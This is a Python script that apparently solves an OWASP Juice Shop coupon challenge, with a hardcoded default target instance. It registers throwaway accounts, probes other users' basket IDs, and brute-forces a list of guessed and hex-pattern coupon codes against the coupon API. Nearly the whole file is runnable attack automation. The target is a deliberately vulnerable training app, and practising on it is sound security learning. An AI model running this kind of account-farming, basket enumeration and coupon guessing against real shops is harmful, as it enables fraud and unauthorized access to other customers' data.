#!/usr/bin/env python3
"""
Smart Coupon Solver - Ultrathink Analysis Results
=================================================
Based on JavaScript analysis, targeting specific found coupon codes.

Usage:
    python3 smart_coupon_solver.py
"""

import requests
import json
import time
import sys
from urllib.parse import urljoin

# ============================================================================
# CONFIGURATION - Change these values for your Juice Shop instance
# ============================================================================

DEFAULT_JUICE_SHOP_URL = "https://juice5.wonkatech.org"  # <-- CHANGE THIS

# Discovered coupon codes from ultrathink analysis
DISCOVERED_CODES = [
    "8343D2",      # Hex pattern found in JavaScript
    "PROMOTION",   # Promotional code found
]

# Additional hex patterns to try (based on 8343D2)
HEX_PATTERNS = [
    "8343D2", "A1B2C3", "1234AB", "ABCD12", "123456", "ABCDEF",
    "FF0000", "00FF00", "0000FF", "FFFFFF", "000000", "123ABC"
]

# ============================================================================

class Colors:
    HEADER = '\033[95m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class SmartCouponSolver:
    """Smart coupon solver targeting specific discovered codes"""

    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        self.token = None
        self.basket_id = None

    def authenticate(self):
        """Quick authentication setup"""
        print(f"{Colors.CYAN}🔑 Authenticating...{Colors.ENDC}")

        timestamp = str(int(time.time()))
        email = f"test{timestamp}@test.com"
        password = f"Test123!{timestamp}"

        # Register
        register_data = {
            "email": email,
            "password": password,
            "passwordRepeat": password,
            "securityQuestion": {"id": 1, "question": "Your elder siblings middle name?"},
            "securityAnswer": "test"
        }

        try:
            self.session.post(urljoin(self.base_url, '/api/Users/'), json=register_data)
        except:
            pass

        # Login
        login_response = self.session.post(
            urljoin(self.base_url, '/rest/user/login'),
            json={"email": email, "password": password}
        )

        if login_response.status_code == 200:
            result = login_response.json()
            self.token = result.get('authentication', {}).get('token')
            if self.token:
                self.session.headers['Authorization'] = f'Bearer {self.token}'
                print(f"{Colors.GREEN}✅ Authenticated{Colors.ENDC}")
                return True

        return False

    def get_basket_id(self):
        """Get the correct basket ID"""
        print(f"{Colors.CYAN}🛒 Getting basket...{Colors.ENDC}")

        # Method 1: Get from user info
        whoami_response = self.session.get(urljoin(self.base_url, '/rest/user/whoami'))
        if whoami_response.status_code == 200:
            user_data = whoami_response.json().get('user', {})
            bid = user_data.get('bid')
            if bid:
                self.basket_id = bid
                print(f"   Found basket ID: {self.basket_id}")
                return True

        # Method 2: Try to get existing basket
        for test_id in [1, 2, 3]:
            basket_response = self.session.get(urljoin(self.base_url, f'/rest/basket/{test_id}'))
            if basket_response.status_code == 200:
                self.basket_id = test_id
                print(f"   Using basket ID: {self.basket_id}")
                return True

        # Method 3: Add product to create basket
        products_response = self.session.get(urljoin(self.base_url, '/rest/products/search'))
        if products_response.status_code == 200:
            products = products_response.json().get('data', [])
            if products:
                # Add first product
                basket_data = {"ProductId": products[0]['id'], "quantity": 1}
                basket_response = self.session.post(
                    urljoin(self.base_url, '/api/BasketItems/'),
                    json=basket_data
                )
                if basket_response.status_code in [200, 201]:
                    self.basket_id = 1  # Default
                    print(f"   Created basket with ID: {self.basket_id}")
                    return True

        print(f"{Colors.YELLOW}⚠️  Using default basket ID: 1{Colors.ENDC}")
        self.basket_id = 1
        return True

    def test_specific_coupon(self, code):
        """Test a specific coupon code"""
        coupon_url = urljoin(self.base_url, f'/rest/basket/{self.basket_id}/coupon/{code}')

        try:
            response = self.session.put(coupon_url, json={})

            if response.status_code == 200:
                result = response.json()
                discount = result.get('discount', 0)

                if discount and discount > 0:
                    print(f"{Colors.GREEN}🎯 SUCCESS! Valid coupon: {code} - {discount}% discount{Colors.ENDC}")
                    return True
                else:
                    print(f"   {code}: No discount")
            else:
                print(f"   {code}: HTTP {response.status_code}")

        except Exception as e:
            print(f"   {code}: Error - {e}")

        return False

    def solve(self):
        """Solve the challenge with discovered codes"""
        print(f"\n{Colors.BOLD}{Colors.HEADER}🧠 SMART COUPON SOLVER - TARGETING DISCOVERED CODES{Colors.ENDC}\n")

        if not self.authenticate():
            print(f"{Colors.RED}❌ Authentication failed{Colors.ENDC}")
            return False

        if not self.get_basket_id():
            print(f"{Colors.RED}❌ Basket setup failed{Colors.ENDC}")
            return False

        print(f"\n{Colors.CYAN}🎯 Testing discovered coupon codes...{Colors.ENDC}")

        # Test discovered codes first
        for code in DISCOVERED_CODES:
            if self.test_specific_coupon(code):
                print(f"\n{Colors.GREEN}{Colors.BOLD}🎉 CHALLENGE SOLVED!{Colors.ENDC}")
                return True

        # Test hex patterns
        print(f"\n{Colors.CYAN}🔍 Testing hex pattern variations...{Colors.ENDC}")
        for code in HEX_PATTERNS:
            if self.test_specific_coupon(code):
                print(f"\n{Colors.GREEN}{Colors.BOLD}🎉 CHALLENGE SOLVED!{Colors.ENDC}")
                return True

        return False


def main():
    if len(sys.argv) > 1:
        url = sys.argv[1]
    else:
        print(f"{Colors.CYAN}Using default: {DEFAULT_JUICE_SHOP_URL}{Colors.ENDC}")
        url = DEFAULT_JUICE_SHOP_URL

    solver = SmartCouponSolver(url)
    solver.solve()

if __name__ == '__main__':
    main()